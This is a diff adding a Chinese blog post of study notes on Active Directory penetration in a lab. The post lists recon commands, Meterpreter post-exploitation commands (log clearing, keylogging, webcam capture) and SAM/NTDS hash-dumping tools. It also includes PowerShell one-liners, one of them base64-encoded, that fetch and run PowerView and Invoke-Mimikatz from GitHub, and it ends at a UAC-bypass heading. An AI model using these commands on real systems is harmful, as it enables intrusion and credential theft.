@@ -1,0 +1,1373 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.2/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="web,域渗透,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Blog of 1ypt0" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/lypto.ico?v=5.1.1">
+
+
+
+
+
+
+<meta name="description" content="耽搁了一些时间的域渗透相关的学习总结，虽说之前零散的看了一些资料，但没有进行相关的汇总和总结。备考完期末考试后需要静下心来把这些零散的知识点进行复盘，之前的WS 2012环境忘记密码了，所以重新搭建了一个模拟的单树域环境进行相关概念的映证以及工具的使用。">
+<meta name="keywords" content="web,域渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域渗透（一）">
+<meta property="og:url" content="http://lypto.me/2019/01/25/域渗透（一）/index.html">
+<meta property="og:site_name" content="Blog of 1ypt0">
+<meta property="og:description" content="耽搁了一些时间的域渗透相关的学习总结，虽说之前零散的看了一些资料，但没有进行相关的汇总和总结。备考完期末考试后需要静下心来把这些零散的知识点进行复盘，之前的WS 2012环境忘记密码了，所以重新搭建了一个模拟的单树域环境进行相关概念的映证以及工具的使用。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://lypto.me/myimages/域渗透（一）/powershell_mimikatz.PNG">
+<meta property="og:updated_time" content="2019-01-24T16:59:31.054Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="域渗透（一）">
+<meta name="twitter:description" content="耽搁了一些时间的域渗透相关的学习总结，虽说之前零散的看了一些资料，但没有进行相关的汇总和总结。备考完期末考试后需要静下心来把这些零散的知识点进行复盘，之前的WS 2012环境忘记密码了，所以重新搭建了一个模拟的单树域环境进行相关概念的映证以及工具的使用。">
+<meta name="twitter:image" content="http://lypto.me/myimages/域渗透（一）/powershell_mimikatz.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":0,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://lypto.me/2019/01/25/域渗透（一）/">
+
+
+
+
+
+  <title>域渗透（一） | Blog of 1ypt0</title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?47d7b880e7f466d86f6a2755e80a6337";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+	<a href="https://github.com/IversionBY"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_red_aa0000.png" alt="Fork me on GitHub"></a>
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Blog of 1ypt0</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://lypto.me/2019/01/25/域渗透（一）/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="1ypt0">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/109.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Blog of 1ypt0">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">域渗透（一）</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-25T00:54:17+08:00">
+                Jan 25 2019
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/01/25/域渗透（一）/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/01/25/域渗透（一）/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  3k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  12
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>耽搁了一些时间的域渗透相关的学习总结，虽说之前零散的看了一些资料，但没有进行相关的汇总和总结。备考完期末考试后需要静下心来把这些零散的知识点进行复盘，之前的WS 2012环境忘记密码了，所以重新搭建了一个模拟的单树域环境进行相关概念的映证以及工具的使用。<br><a id="more"></a></p>
+</blockquote>
+<h1 id="DOS搜集"><a href="#DOS搜集" class="headerlink" title="DOS搜集"></a>DOS搜集</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">systeminfo                                           # 查询系统信息</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; # 查询操作系统名称及版本（英文）</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;     # 查询操作系统名称及版本（中文）</span><br><span class="line">echo %PROCESSOR_ARCHITECTURE% # 查询系统体系结构</span><br><span class="line">SET                                                  # 查询所有环境变量</span><br><span class="line">whoami                                               # 查询当前用户信息</span><br><span class="line">ipconfig /all                                        # 查询本机IP、网关、DNS、IP段、所在域相关信息</span><br><span class="line">netstat -an                                          # 查询所有和本地计算机建立连接的IP</span><br><span class="line">net start                                            # 查询已启动服务</span><br><span class="line">net time /domain                                     # 查询域时间，以及域服务器的名字（快速查找域的方法）</span><br><span class="line">net user                                             # 查询本机用户列表</span><br><span class="line">net user xxx                                         # 查询指定用户信息</span><br><span class="line">net user /domain                                     # 查询域用户</span><br><span class="line">net user /domain xxx  12345678                       # 修改域用户密码（需要域管理员权限）</span><br><span class="line">net user domain-admin /domain                        # 查询域管理员登录时间，密码过期时间，是否有登录脚本，组分配等信息</span><br><span class="line">net localgroup administrator                         # 查询本机管理员（通常含有域用户）</span><br><span class="line">net localgroup administrator /domain                 # 查询登录本机的域管理员</span><br><span class="line">net localgroup administrator domain_name\pyxyuyu /add # 域用户（Users组）添加到本机Administrator组（需要本机管理员或域管理员在本机登录域后才能进行）</span><br><span class="line">net view                                             # 查询同一域（工作组）内机器列表，列出的机器不一定在同一个网段，但是在网络结构中有联系</span><br><span class="line">net view /domain                                     # 查询域（工作组）列表（可以查看计算机是否在某个域或工作组内）</span><br><span class="line">net view /domain:domain_name                         # 查询指定域内计算机列表</span><br><span class="line">net group # 查看域的组</span><br><span class="line">net group /domain                                    # 查看所在域的工作组</span><br><span class="line">net group &quot;domain admins&quot; /domain                    # 查询域管理员用户组</span><br><span class="line">net group &quot;domain users&quot; /domain                     # 查询域成员用户组</span><br><span class="line">net group &quot;Domain controllers&quot;                       # 查询域控制器（如果有多台的话）</span><br><span class="line">ping 机器名                                           # 查询该计算机对应的IP，可以通过不同的机器来分析有哪些网段，了解本机在网络结构中所占角色</span><br><span class="line">ping 域                                              # 查询域服务器的IP</span><br><span class="line">route print                                          # 查询路由表信息</span><br><span class="line">arp -A                                               # 查询ARP缓存信息</span><br><span class="line">netsh firewall show config                           # 查询防火墙配置</span><br><span class="line">netsh firewall show state                            # 查询防火墙状态</span><br><span class="line">schtasks /QUERY /fo LIST /v                          # 查询计划任务（英文，中文系统的话，得先执行 chcp 437）</span><br><span class="line">tasklist /SVC                                        # 查询服务进程ID</span><br><span class="line">DRIVERQUERY                                          # 查询安装驱动</span><br><span class="line">wmic product list brief                              # 查询安装程序和版本信息（漏洞利用线索）</span><br></pre></td></tr></table></figure>
+<h1 id="dsquery-查询"><a href="#dsquery-查询" class="headerlink" title="dsquery 查询"></a>dsquery 查询</h1><p>dsquery 时DS 上系统自带的查询命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dsquery computer   查找目录中的计算机。</span><br><span class="line">dsquery contact    查找目录中的联系人。</span><br><span class="line">dsquery subnet     查找目录中的子网。</span><br><span class="line">dsquery group      查找目录中的组。</span><br><span class="line">dsquery ou         查找目录中的组织单位。</span><br><span class="line">dsquery site       查找目录中的站点。</span><br><span class="line">dsquery server     查找目录中的 AD DC/LDS 实例。</span><br><span class="line">dsquery user       查找目录中的用户。</span><br><span class="line">dsquery quota      查找目录中的配额规定。</span><br><span class="line">dsquery partition  查找目录中的分区。</span><br><span class="line">dsquery *          用通用的LDAP查询来查找目录中的任何对象。</span><br></pre></td></tr></table></figure></p>
+<h1 id="运用powerview"><a href="#运用powerview" class="headerlink" title="运用powerview"></a>运用powerview</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Powershell.exe -Nop -NonI -Exec Bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1&apos;);Get-HostIP&quot;</span><br><span class="line"></span><br><span class="line"># 参数详解</span><br><span class="line">--[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;           开启ssl，避免https报错</span><br><span class="line">-Command	        需要执行的代码</span><br><span class="line">-ExecutionPolicy	设置默认的执行策略，一般使用Bypass</span><br><span class="line">-EncodedCommand	    执行Base64代码</span><br><span class="line">-File	            这是需要执行的脚本名</span><br><span class="line">-NoExit	            执行完成命令之后不会立即退出，比如我们执行powerhsell whoami，执行完成之后会推出我们的PS会话，如果我们加上这个参数，运行完之后还是会继续停留在PS的界面</span><br><span class="line">-NoLogo	            不输出PS的Banner信息</span><br><span class="line">-Noninteractive	    不开启交互式的会话</span><br><span class="line">-NoProfile	        不使用当前用户使用的配置文件</span><br><span class="line">-Sta	            以单线程模式启动ps</span><br><span class="line">-Version	        设置用什么版本去执行代码</span><br><span class="line">-WindowStyle	    设置Powershell的执行窗口，有下面的参数Normal, Minimized, Maximized, or Hidden</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Get-NetDomain                   -   获取当前用户所在域</span><br><span class="line">Get-NetForest                   -   获取和当前用户域相关的域森林</span><br><span class="line">Get-NetForestDomains            -   获取所有的域森</span><br><span class="line">Get-NetDomainControllers        -   在当前用户域中获取域控</span><br><span class="line">Get-NetCurrentUser              -   获取当前用户名</span><br><span class="line">Get-NetUser                     -   返回所有用户或者指定用户</span><br><span class="line">Get-NetUserSPNs                 -   获取所有用户的服务资本</span><br><span class="line">Get-NetOUs                      -   获取域组织单元的数据</span><br><span class="line">Get-NetGUIDOUs                  -   查找链接到特定GUID的域组织单元</span><br><span class="line">Invoke-NetUserAdd               -   增加一个域用户</span><br><span class="line">Get-NetGroups                   -   获取当前用户组列表</span><br><span class="line">Get-NetGroup                    -   在一个特殊的用户组中获取每个用户的数据</span><br><span class="line">Get-NetLocalGroups              -   获取远程主机上的本地用户组</span><br><span class="line">Get-NetLocalGroup               -   获取远程主机上的本地组的成员</span><br><span class="line">Get-NetLocalServices            -   获取远程主机上正在运行的服务/路径的列表</span><br><span class="line">Invoke-NetGroupUserAdd          -   将用户添加到指定的本地或域组</span><br><span class="line">Get-NetComputers                -   获取域中所有当前服务器的列表</span><br><span class="line">Get-NetFileServers              -   获取当前域用户使用的文件服务器列表</span><br><span class="line">Get-NetShare                    -   获取指定服务器的共享信息</span><br><span class="line">Get-NetLoggedon                 -   使用户主动登录到指定的服务器</span><br><span class="line">Get-NetSessions                 -   获取指定服务器上的活动会话</span><br><span class="line">Get-NetFileSessions             -   组合Get-NetSessions和Get-NetFiles命令的返回结果</span><br><span class="line">Get-NetConnections              -   获取连接到特定服务器资源的活动连接(共享)</span><br><span class="line">Get-NetFiles                    -   获取服务器上打开的文件</span><br><span class="line">Get-NetProcesses                -   获取远程服务器上的远程进程和所有者</span><br></pre></td></tr></table></figure>
+<h1 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt;background    #把会话挂到后台</span><br><span class="line">meterpreter&gt;clearev       #清除日志</span><br><span class="line">meterpreter&gt;localtime     #查看靶机的时间</span><br><span class="line">meterpreter&gt;hashdump      #获取目标系统Hash值</span><br><span class="line">meterpreter&gt;migrate PID   #进程迁移</span><br><span class="line">meterpreter&gt;webcam_list   #查看目标是否有摄像头</span><br><span class="line">meterpreter&gt;webcam_snap   #连接摄像头拍摄照片</span><br><span class="line">meterpreter&gt;webcam_stream #用摄像头录像</span><br><span class="line">meterpreter&gt;router        #查看路由</span><br><span class="line">meterpreter&gt;screenshot    #截取目标屏幕</span><br><span class="line">meterpreter&gt;getuid        #查看当前用户</span><br><span class="line">meterpreter&gt;getsystem     #提升至system权限</span><br><span class="line">meterpreter&gt;getprivs      #查看当前权限</span><br><span class="line">meterpreter&gt;sysinfo       #查看目标系统信息</span><br><span class="line">meterpreter&gt;keyscan_start #开始键盘记录</span><br><span class="line">meterpreter&gt;keyscan_dump  #获取键盘记录内容</span><br><span class="line">meterpreter&gt;record_mic    #录音</span><br><span class="line">meterpreter&gt;run post/windows/manage/enable_rdp  #开启3389端口</span><br><span class="line">meterpreter&gt;run getgui -u 用户名 -p 密码  添加账户</span><br><span class="line">meterpreter&gt;run getgui -e  #链接远程桌面窗口</span><br><span class="line">meterpreter&gt;sessions -i index #与会话进行交互，index表示第一个session </span><br><span class="line">meterpreter&gt;cat               #查看文件内容</span><br><span class="line">meterpreter&gt;getwd             #查看当前工作目录</span><br><span class="line">meterpreter&gt;upload            #上传文件到目标机上</span><br><span class="line">meterpreter&gt;download          #下载文件到本机上</span><br><span class="line">meterpreter&gt;c:\\1.txt         #编辑或创建文件  没有的话，会新建文件</span><br><span class="line">meterpreter&gt;search -f *pass*  # 搜索文件  -h查看帮助</span><br><span class="line">meterpreter&gt;rm C:\\test\\bytes.txt  #删除文件</span><br><span class="line">meterpreter&gt;portfwd add -l 4444 -p 3389 -r 192.168.1.102 # 端口转发，本机监听4444，把目标机3389转到本机4444</span><br><span class="line">meterpreter&gt;execute -H -i -f cmd.exe #创建新进程cmd.exe，-H不可见，-i交互</span><br><span class="line">meterpreter&gt;kill pid #杀死进程</span><br><span class="line">meterpreter&gt;info #查看已有模块信息</span><br><span class="line">meterpreter&gt;idletime #查看目标机闲置时间</span><br><span class="line">meterpreter&gt;uictl disable mouse  #禁用鼠标</span><br><span class="line">meterpreter&gt;uictl disable keyboard  #禁用键盘</span><br><span class="line">meterpreter&gt;getproxy   #查看代理信息</span><br><span class="line">meterpreter&gt;run autoroute -s 192.168.159.0/24  #添加到目标环境网络</span><br><span class="line">meterpreter&gt;run autoroute –p  #查看添加的路由</span><br><span class="line">meterpreter&gt;run post/windows/gather/checkvm #是否windows虚拟机</span><br><span class="line">meterpreter&gt;run post/linux/gather/checkvm #是否linux虚拟机</span><br><span class="line">meterpreter&gt;run post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24 端口扫描</span><br><span class="line">meterpreter&gt;run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=3389 端口扫描</span><br><span class="line">meterpreter&gt;run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">meterpreter&gt;execute -f 程序      #执行一个程序</span><br></pre></td></tr></table></figure>
+<h1 id="密码hash文件"><a href="#密码hash文件" class="headerlink" title="密码hash文件"></a>密码hash文件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 本机密码hash</span><br><span class="line">C:\windows\system32\config\SAM</span><br><span class="line">C:\Windows\System32\config\SYSTEM</span><br><span class="line"></span><br><span class="line"># 域环境密码hash</span><br><span class="line">C:\Windows\NTDS</span><br><span class="line">C:\Windows\SYSVOL</span><br></pre></td></tr></table></figure>
+<p>在windows xp，server2003之前包括xp&amp;2003的系统都可以通过工具抓取到完整的LM HASH&amp;NT HASH的。这样就可以直接通过在线的破译网站进行密码破解。</p>
+<h2 id="SAM密码文件extract"><a href="#SAM密码文件extract" class="headerlink" title="SAM密码文件extract"></a>SAM密码文件extract</h2><blockquote>
+<p>参考来源： <a href="https://computersecuritystudent.com/SECURITY_TOOLS/PASSWORD_CRACKING/lesson2/index.html" target="_blank" rel="noopener">https://computersecuritystudent.com/SECURITY_TOOLS/PASSWORD_CRACKING/lesson2/index.html</a></p>
+</blockquote>
+<p>对SAM的破解需要用到两个文件(SYSTEM,SAM)和两个工具(bkhive,samdump2)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bkhive [SYSTEM] [syskey.txt]</span><br><span class="line">samdump2 [SAM] [syskey.txt]&gt;hashes.txt</span><br></pre></td></tr></table></figure></p>
+<p>但是，在最新的发布版本里面，samdump2已经把bkhive集成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">samdump2 [OPTION]... SYSTEM_FILE SAM_FILE</span><br></pre></td></tr></table></figure></p>
+<h2 id="NTDS-DIT-extract"><a href="#NTDS-DIT-extract" class="headerlink" title="NTDS.DIT extract"></a>NTDS.DIT extract</h2><blockquote>
+<p>下面几篇文章值得借阅<br><a href="http://www.nsoad.com/Article/system/20160915/400.html" target="_blank" rel="noopener">http://www.nsoad.com/Article/system/20160915/400.html</a><br><a href="http://www.4hou.com/technology/12579.html" target="_blank" rel="noopener">http://www.4hou.com/technology/12579.html</a><br><a href="https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/" target="_blank" rel="noopener">https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/</a><br><a href="https://www.freebuf.com/articles/system/177764.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/177764.html</a>  </p>
+<p>下面这个网址给出了如何将密码hash导出成为john或者hashcat格式：<br><a href="https://blog.didierstevens.com/2016/07/13/practice-ntds-dit-file-part-2-extracting-hashes/" target="_blank" rel="noopener">https://blog.didierstevens.com/2016/07/13/practice-ntds-dit-file-part-2-extracting-hashes/</a></p>
+<p>当然如果有比较好的字典，可以直接进行密码的爆破<br><a href="https://github.com/dafthack/DomainPasswordSpray" target="_blank" rel="noopener">https://github.com/dafthack/DomainPasswordSpray</a></p>
+</blockquote>
+<h2 id="mimikatz-module-lsadump"><a href="#mimikatz-module-lsadump" class="headerlink" title="mimikatz module~lsadump"></a>mimikatz module~lsadump</h2><p>上述链接介绍了针对<code>windows LM HASH&amp;NT HASH</code>众工具集，下面主要以mimikatz module~lsadump为例，进行一些实验操作。</p>
+<blockquote>
+<p>参考链接： <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump</a></p>
+</blockquote>
+<h2 id="mimikatz无文件导hash"><a href="#mimikatz无文件导hash" class="headerlink" title="mimikatz无文件导hash"></a>mimikatz无文件导hash</h2><p>以下攻击向量在windows server 2012 测试通过，然而windows10 测试不通过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Powershell.exe -Nop -NonI -Exec Bypass &quot;[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&apos;);Invoke-Mimikatz&quot;</span><br><span class="line"></span><br><span class="line">#加密版</span><br><span class="line">powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEA</span><br><span class="line">G8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuA</span><br><span class="line">GMAbwBtAC8AUABvAHcAZQByAFMAaABlAGwAbABNAGEAZgBpAGEALwBQAG8AdwBlAHIAUwBwAGwAbwBpAHQALwBtAGEAcwB0AGUAcgAvAEUAeABmAGkAbAB0A</span><br><span class="line">HIAYQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAnACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtA</span><br><span class="line">GkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==</span><br></pre></td></tr></table></figure>
+<p>windows server 2012 运行截图</p>
+<p><img src="/myimages/域渗透（一）/powershell_mimikatz.PNG" alt="image"></p>
+<h1 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h1><p>UAC机制在 Vista版本引进，并在后续的版本，如 windows7 和windows server2012 windows10……上面均有沿用。</p>
+<blockquote>
